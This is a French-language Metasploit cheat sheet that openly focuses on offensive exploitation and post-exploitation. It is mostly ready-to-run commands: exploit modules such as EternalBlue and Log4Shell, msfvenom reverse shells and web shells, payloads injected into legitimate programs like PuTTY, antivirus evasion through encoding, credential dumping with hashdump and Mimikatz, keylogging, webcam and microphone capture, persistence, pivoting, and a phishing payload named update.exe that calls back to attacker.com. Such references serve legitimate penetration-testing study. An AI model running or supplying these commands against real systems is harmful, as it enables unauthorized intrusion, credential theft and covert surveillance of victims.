# 💥 Metasploit Framework - Cheatsheet Cyber Sécurité

Guide orienté **exploitation de vulnérabilités** et **post-exploitation** avec Metasploit Framework. Focus sur l'utilisation offensive et le pwn.

---

## 📖 Qu'est-ce que Metasploit ?

**Metasploit Framework** est le framework d'exploitation le plus puissant permettant de :
- Exploiter des vulnérabilités connues
- Générer des payloads
- Post-exploitation et persistence
- Pivoting et lateral movement
- Évasion d'antivirus
- Social engineering

**Base de données** : 2,300+ exploits, 600+ payloads, 1,100+ auxiliaires

---

## 1️⃣ Démarrage et Navigation

### Lancer Metasploit

```bash
# Console Metasploit
msfconsole

# Quiet mode (sans banner)
msfconsole -q

# Charger un resource script
msfconsole -r script.rc

# Avec base de données
msfdb init
msfconsole
```

### Commandes de base

```bash
# Aide
help
help search
help set

# Version
version

# Quitter
exit
quit

# Nettoyer l'écran
clear

# Historique
history

# Banner aléatoire
banner
```

---

## 2️⃣ Recherche d'Exploits

### Recherche basique

```bash
# Par service
msf6 > search apache
msf6 > search ssh
msf6 > search smb

# Par CVE
msf6 > search cve:2021-41773
msf6 > search cve:2017-0144

# Par nom
msf6 > search eternalblue
msf6 > search shellshock
msf6 > search log4shell
```

### Recherche avancée

```bash
# Par plateforme
msf6 > search platform:windows
msf6 > search platform:linux
msf6 > search platform:unix

# Par type
msf6 > search type:exploit
msf6 > search type:auxiliary
msf6 > search type:post

# Par rank
msf6 > search rank:excellent
msf6 > search rank:great

# Par date
msf6 > search date:2021
msf6 > search date:2023

# Par auteur
msf6 > search author:metasploit
```

### Filtres combinés

```bash
# Multiple critères
msf6 > search apache type:exploit platform:linux

# Exclure
msf6 > search windows -s date

# Avec rank minimum
msf6 > search smb rank:excellent

# Remote exploits seulement
msf6 > search type:exploit platform:windows rank:excellent
```

---

## 3️⃣ Utilisation d'un Exploit

### Charger et configurer

```bash
# Utiliser un module
msf6 > use exploit/multi/http/apache_normalize_path_rce

# Informations sur le module
msf6 exploit(apache_rce) > info

# Options disponibles
msf6 exploit(apache_rce) > show options

# Options avancées
msf6 exploit(apache_rce) > show advanced

# Payloads compatibles
msf6 exploit(apache_rce) > show payloads

# Targets disponibles
msf6 exploit(apache_rce) > show targets
```

### Configuration des options

```bash
# Définir RHOSTS (target)
msf6 exploit(apache_rce) > set RHOSTS 192.168.1.100

# Définir RPORT
msf6 exploit(apache_rce) > set RPORT 80

# Définir LHOST (attacker IP)
msf6 exploit(apache_rce) > set LHOST 192.168.1.50

# Définir LPORT
msf6 exploit(apache_rce) > set LPORT 4444

# Voir configuration actuelle
msf6 exploit(apache_rce) > options
```

### Exploitation

```bash
# Vérifier si vulnérable (si disponible)
msf6 exploit(apache_rce) > check

# Exploiter
msf6 exploit(apache_rce) > exploit

# Ou run
msf6 exploit(apache_rce) > run

# Exploiter en background
msf6 exploit(apache_rce) > exploit -j

# Exploiter avec payload spécifique
msf6 exploit(apache_rce) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(apache_rce) > exploit
```

---

## 4️⃣ Payloads

### Types de payloads

**Staged** (multi-étapes)
```bash
# Windows
windows/meterpreter/reverse_tcp      # Meterpreter staged
windows/shell/reverse_tcp            # Shell standard staged

# Linux
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp

# Avantage : Petit fichier initial, fonctionnalités chargées après
```

**Stageless** (single-stage)
```bash
# Windows
windows/meterpreter_reverse_tcp      # Meterpreter stageless
windows/shell_reverse_tcp            # Shell stageless

# Linux
linux/x86/meterpreter_reverse_tcp
linux/x64/shell_reverse_tcp

# Avantage : Tout en un seul fichier, évite détection staged
```

### Payloads populaires

```bash
# Reverse shells
windows/meterpreter/reverse_tcp      # Le plus utilisé
linux/x64/meterpreter/reverse_tcp
python/meterpreter/reverse_tcp
php/meterpreter/reverse_tcp
java/meterpreter/reverse_tcp

# Bind shells
windows/meterpreter/bind_tcp
linux/x64/shell/bind_tcp

# Reverse HTTPS (évasion)
windows/meterpreter/reverse_https
linux/x64/meterpreter/reverse_https

# Reverse DNS (évasion ultime)
windows/meterpreter/reverse_dns
```

---

## 5️⃣ Meterpreter

### Commandes système

```bash
# Informations système
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid

# Processus
meterpreter > ps
meterpreter > getpid
meterpreter > migrate PID

# Exécuter commandes
meterpreter > execute -f cmd.exe -i
meterpreter > shell              # Shell interactif
```

### Navigation fichiers

```bash
# Système de fichiers
meterpreter > pwd
meterpreter > cd C:\\Users\\Admin
meterpreter > ls
meterpreter > cat file.txt
meterpreter > search -f *.txt

# Download/Upload
meterpreter > download C:\\secrets\\passwords.txt
meterpreter > upload /root/tool.exe C:\\Windows\\Temp\\

# Permissions
meterpreter > getwd             # Current directory
meterpreter > rm file.txt
meterpreter > mkdir test
```

### Capture de credentials

```bash
# Hashdump (Windows)
meterpreter > hashdump

# Mimikatz (via Kiwi extension)
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > lsa_dump_sam
meterpreter > kiwi_cmd sekurlsa::logonpasswords

# Tokens
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
```

### Screenshots et keylogging

```bash
# Screenshot
meterpreter > screenshot

# Webcam
meterpreter > webcam_list
meterpreter > webcam_snap

# Keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# Micro
meterpreter > record_mic
```

### Persistence

```bash
# Persistence simple
meterpreter > run persistence -X -i 60 -p 4444 -r 192.168.1.50

# Via registry (Windows)
meterpreter > run persistence -X -i 60 -r 192.168.1.50

# Scheduled task
meterpreter > run scheduleme
meterpreter > run schtaskabuse

# Service
meterpreter > run metsvc
```

### Pivoting

```bash
# Ajouter route
meterpreter > run autoroute -s 10.10.10.0/24

# Port forwarding
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5

# Liste routes
meterpreter > run autoroute -p

# SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVPORT 1080
msf6 auxiliary(socks_proxy) > run -j
```

---

## 6️⃣ Modules Auxiliaires

### Scanners

```bash
# Port scan
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(tcp) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(tcp) > set PORTS 21,22,23,80,443,445,3389
msf6 auxiliary(tcp) > run

# SMB version
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(smb_version) > run

# HTTP version
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(http_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(http_version) > run
```

### Brute force

```bash
# SSH brute force
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(ssh_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(ssh_login) > set USER_FILE users.txt
msf6 auxiliary(ssh_login) > set PASS_FILE passwords.txt
msf6 auxiliary(ssh_login) > run

# FTP brute force
msf6 > use auxiliary/scanner/ftp/ftp_login

# SMB brute force
msf6 > use auxiliary/scanner/smb/smb_login

# MySQL brute force
msf6 > use auxiliary/scanner/mysql/mysql_login

# PostgreSQL
msf6 > use auxiliary/scanner/postgres/postgres_login
```

### Exploitation SMB

```bash
# EternalBlue (MS17-010)
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010) > set RHOSTS 192.168.1.100
msf6 exploit(ms17_010) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(ms17_010) > set LHOST 192.168.1.50
msf6 exploit(ms17_010) > exploit

# SMBGhost (CVE-2020-0796)
msf6 > use exploit/windows/smb/cve_2020_0796_smbghost

# MS08-067
msf6 > use exploit/windows/smb/ms08_067_netapi
```

---

## 7️⃣ Post-Exploitation

### Modules post-exploitation

```bash
# Énumération Windows
meterpreter > run post/windows/gather/enum_applications
meterpreter > run post/windows/gather/enum_shares
meterpreter > run post/windows/gather/credentials/windows_autologin
meterpreter > run post/windows/gather/checkvm

# Énumération Linux
meterpreter > run post/linux/gather/enum_configs
meterpreter > run post/linux/gather/enum_network
meterpreter > run post/linux/gather/checkvm

# Privilege escalation suggester
meterpreter > run post/multi/recon/local_exploit_suggester
```

### Privilege Escalation

```bash
# Windows
meterpreter > getsystem

# Bypass UAC
meterpreter > run post/windows/escalate/bypassuac
meterpreter > run exploit/windows/local/bypassuac_injection

# Linux
meterpreter > run post/multi/recon/local_exploit_suggester
# Puis utiliser l'exploit suggéré
```

### Lateral Movement

```bash
# PSExec
msf6 > use exploit/windows/smb/psexec
msf6 exploit(psexec) > set RHOSTS 10.10.10.5
msf6 exploit(psexec) > set SMBUser Administrator
msf6 exploit(psexec) > set SMBPass password123
msf6 exploit(psexec) > exploit

# WMI
msf6 > use exploit/windows/local/wmi

# Pass the Hash
msf6 > use exploit/windows/smb/psexec
msf6 exploit(psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

---

## 8️⃣ Génération de Payloads (msfvenom)

### Reverse shells

```bash
# Windows EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe

# Windows DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f dll > shell.dll

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf > shell.elf

# macOS Mach-O
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho > shell.macho

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.apk
```

### Web shells

```bash
# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw > shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp > shell.asp

# ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f aspx > shell.aspx

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw > shell.jsp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war > shell.war
```

### Payloads encodés (évasion AV)

```bash
# Shikata_ga_nai (encoder populaire)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > encoded.exe

# Multiple encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -e x86/call4_dword_xor -i 5 -f exe > double_encoded.exe

# Liste des encoders
msfvenom -l encoders
```

### Templates et injection

```bash
# Injecter dans EXE légitime
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -x /path/to/legit.exe -f exe > backdoored.exe

# Garder template fonctionnel
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -x putty.exe -k -f exe > backdoored_putty.exe
```

---

## 9️⃣ Handler (Listener)

### Configuration handler

```bash
# Multi/handler universel
msf6 > use exploit/multi/handler
msf6 exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(handler) > set LHOST 192.168.1.50
msf6 exploit(handler) > set LPORT 4444
msf6 exploit(handler) > exploit -j

# Handler automatique (resource script)
echo "use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j" > handler.rc

msfconsole -r handler.rc
```

### Gestion des sessions

```bash
# Lister les sessions
msf6 > sessions

# Interagir avec session
msf6 > sessions -i 1

# Tuer une session
msf6 > sessions -k 1

# Tuer toutes les sessions
msf6 > sessions -K

# Background session
meterpreter > background
# Ou Ctrl+Z

# Upgrader shell vers Meterpreter
msf6 > sessions -u 1
```

---

## 🔟 Base de Données et Workspaces

### Workspaces

```bash
# Lister workspaces
msf6 > workspace

# Créer workspace
msf6 > workspace -a pentest_client1

# Changer workspace
msf6 > workspace pentest_client1

# Supprimer workspace
msf6 > workspace -d old_test

# Renommer
msf6 > workspace -r old new
```

### Base de données

```bash
# Status de la DB
msf6 > db_status

# Importer scan Nmap
msf6 > db_import scan.xml

# Voir les hôtes
msf6 > hosts

# Voir les services
msf6 > services

# Voir les vulnérabilités
msf6 > vulns

# Voir les credentials
msf6 > creds

# Loot (données récupérées)
msf6 > loot

# Notes
msf6 > notes
```

---

## 1️⃣1️⃣ Exploits Populaires

### Windows

```bash
# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue

# BlueKeep (CVE-2019-0708)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

# PrintNightmare (CVE-2021-34527)
use exploit/windows/dcerpc/cve_2021_1675_printnightmare

# Zerologon (CVE-2020-1472)
use exploit/windows/smb/cve_2020_1472_zerologon

# MS08-067
use exploit/windows/smb/ms08_067_netapi
```

### Linux

```bash
# Shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec

# Dirty COW
use exploit/linux/local/cve_2016_5195_dirtycow

# Sudo Baron Samedit
use exploit/linux/local/sudo_baron_samedit

# PwnKit
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
```

### Web

```bash
# Apache 2.4.49 Path Traversal
use exploit/multi/http/apache_normalize_path_rce

# Log4Shell
use exploit/multi/http/log4shell_header_injection

# Struts2
use exploit/multi/http/struts2_content_type_ognl

# Tomcat
use exploit/multi/http/tomcat_mgr_upload

# Jenkins
use exploit/linux/http/jenkins_script_console
```

---

## 1️⃣2️⃣ Social Engineering

### Phishing avec SET

```bash
# Lancer SET depuis Metasploit
msf6 > use auxiliary/server/browser_autopwn2

# Ou utiliser SET directement
setoolkit

# Ou créer payload et setup listener
msfvenom -p windows/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f exe > update.exe

msf6 > use exploit/multi/handler
msf6 exploit(handler) > set payload windows/meterpreter/reverse_https
msf6 exploit(handler) > set LHOST 0.0.0.0
msf6 exploit(handler) > set LPORT 443
msf6 exploit(handler) > exploit -j
```

### Malicious Office Macros

```bash
# Générer macro
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f vba

# Ou utiliser module
msf6 > use exploit/multi/fileformat/office_word_macro
msf6 exploit(office_macro) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(office_macro) > set LHOST 192.168.1.50
msf6 exploit(office_macro) > exploit
```

---

## 1️⃣3️⃣ Évasion d'Antivirus

### Techniques d'évasion

```bash
# Encodage multiple
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > encoded.exe

# Template injection
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -x putty.exe -k -f exe > backdoored.exe

# Custom template
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -x custom_app.exe -k -f exe > malicious.exe

# Payload en mémoire (Powershell)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh-reflection

# HTTPS pour chiffrement
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe > https_shell.exe
```

### Veil-Evasion

```bash
# Générer payload avec Veil
veil

# Puis setup handler Metasploit
msf6 > use exploit/multi/handler
msf6 exploit(handler) > set payload windows/meterpreter/reverse_https
msf6 exploit(handler) > exploit
```

---

## 1️⃣4️⃣ Resource Scripts

### Créer un script

```bash
# handler.rc
cat > handler.rc << EOF
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
set ExitOnSession false
exploit -j -z
EOF

# Exécuter
msfconsole -r handler.rc
```

### Scripts utiles

**Scan automatique**
```bash
# autoscan.rc
workspace -a target_scan
db_nmap -sV -sC target.com
services
vulns
```

**Multi-handler**
```bash
# multi_handler.rc
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

**Post-exploitation automatique**
```bash
# post_exploit.rc
run post/windows/gather/enum_applications
run post/windows/gather/hashdump
run post/windows/gather/enum_shares
screenshot
```

---

## 1️⃣5️⃣ Plugins Utiles

### Charger plugins

```bash
# Lister plugins
msf6 > ls /usr/share/metasploit-framework/plugins/

# Charger plugin
msf6 > load plugin_name

# Plugins populaires
msf6 > load nessus      # Intégration Nessus
msf6 > load nexpose     # Intégration Nexpose
msf6 > load auto_add_route  # Auto routing
msf6 > load alias       # Alias commands
```

### Plugins externes

```bash
# Installer plugins dans
~/.msf4/plugins/

# Exemple : Pentest plugin
git clone https://github.com/darkoperator/Metasploit-Plugins
cp Metasploit-Plugins/pentest.rb ~/.msf4/plugins/
msf6 > load pentest
```

---

## 1️⃣6️⃣ Tips et Astuces

### Performance

```bash
# Limiter threads
set THREADS 10

# Timeout
set ConnectTimeout 5

# Verbose mode
set VERBOSE true

# Debug
set LogLevel 3
```

### Alias

```bash
# Créer alias
alias ll "ls -la"
alias handler "use exploit/multi/handler"

# Sauvegarder alias
save
```

### Global options

```bash
# Options globales (toute session)
setg LHOST 192.168.1.50
setg LPORT 4444
setg payload windows/meterpreter/reverse_tcp

# Voir global options
getg

# Unset global
unsetg LHOST
```

---

## 1️⃣7️⃣ Cheatsheet Rapide

### Workflow d'exploitation

```bash
# 1. Recherche
search cve:2021-41773

# 2. Utiliser module
use exploit/multi/http/apache_normalize_path_rce

# 3. Options
show options
set RHOSTS target.com
set LHOST 192.168.1.50

# 4. Check
check

# 5. Exploit
exploit

# 6. Post-exploitation (si Meterpreter)
sysinfo
hashdump
screenshot
```

### Commandes essentielles

```bash
# Recherche
search [term]
search type:exploit platform:windows

# Module
use [module]
info
show options
set [option] [value]

# Exploitation
check
exploit / run
exploit -j  # Background

# Sessions
sessions
sessions -i [id]
sessions -u [id]  # Upgrade

# Database
workspace
hosts
services
vulns
creds

# Meterpreter
sysinfo
getuid
ps
migrate
hashdump
screenshot
```

---

## 1️⃣8️⃣ Ressources

### Documentation
- Metasploit Unleashed : https://www.metasploitunleashed.com/
- Rapid7 Docs : https://docs.rapid7.com/metasploit/
- GitHub : https://github.com/rapid7/metasploit-framework

### Modules
- Exploit Database : https://www.exploit-db.com/
- Metasploit Modules : https://www.rapid7.com/db/modules/

### Formation
- Offensive Security : Metasploit courses
- TryHackMe : Metasploit rooms
- HackTheBox : Practice labs

---

## 💡 Tips Pro

1. **Toujours check** avant exploit
2. **Workspace par projet** pour organisation
3. **Resource scripts** pour automatisation
4. **Global variables** pour configs répétitives
5. **Multi-handler** en background pour payloads
6. **Migrate process** dès connexion Meterpreter
7. **Hashdump** immédiatement après admin
8. **AutoRoute** pour pivoting
9. **Persistence** pour accès long terme
10. **HTTPS payloads** pour évasion

---

**💥 Metasploit est l'outil d'exploitation le plus puissant. Framework complet pour pentest professionnel !**
